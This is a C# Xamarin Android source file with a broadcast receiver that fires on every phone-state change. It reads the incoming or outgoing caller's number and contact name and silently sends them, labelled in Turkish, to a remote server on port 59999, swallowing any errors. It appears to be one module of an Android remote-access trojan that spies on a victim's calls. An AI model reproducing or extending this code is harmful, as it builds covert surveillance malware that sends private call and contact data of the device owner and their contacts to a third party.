using System.Text;

using Android.App;
using Android.Content;
using Android.Telephony;

namespace Task2
{
    [BroadcastReceiver(Enabled = true, Exported = true)]
    [IntentFilter(new[] { TelephonyManager.ActionPhoneStateChanged })]
    public class PhonecallReceiver : BroadcastReceiver
    {
        public override void OnReceive(Context context, Intent intent)
        {
           
            string state = intent.GetStringExtra(TelephonyManager.ExtraState);
            if (intent.Action == TelephonyManager.ActionPhoneStateChanged)
            {
                
                if (state == TelephonyManager.ExtraStateRinging)
                {
                    if (state != TelephonyManager.ExtraStateIdle)
                    {
                        var number = intent.GetStringExtra(TelephonyManager.ExtraIncomingNumber);
                        if (!string.IsNullOrEmpty(number))
                        {
                            try
                            {
                                byte[] arama = Encoding.UTF8.GetBytes("ARAMA|" + "Gelen Arama" + "=" + 
                                  ((MainActivity)MainActivity.global_activity).telefondanIsim(number) + "/" + number + "=|");
                                PictureCallback.Send(MainActivity.server, arama, 0, arama.Length, 59999);
                            }
                            catch (System.Exception) { }
                        }
                    }
                }
                else
                {
                    if (state != TelephonyManager.ExtraStateIdle)
                    {
                        var number = intent.GetStringExtra(TelephonyManager.ExtraIncomingNumber);
                        if (!string.IsNullOrEmpty(number))
                        {
                            try { 
                            byte[] arama = Encoding.UTF8.GetBytes("ARAMA|" + "Giden Arama" + "=" +
                                 ((MainActivity)MainActivity.global_activity).telefondanIsim(number) + "/" + number + "=|");
                            PictureCallback.Send(MainActivity.server, arama, 0, arama.Length, 59999);
                            }
                            catch (System.Exception) { }
                        }
                    }
                }
            }
            
        }
    }
}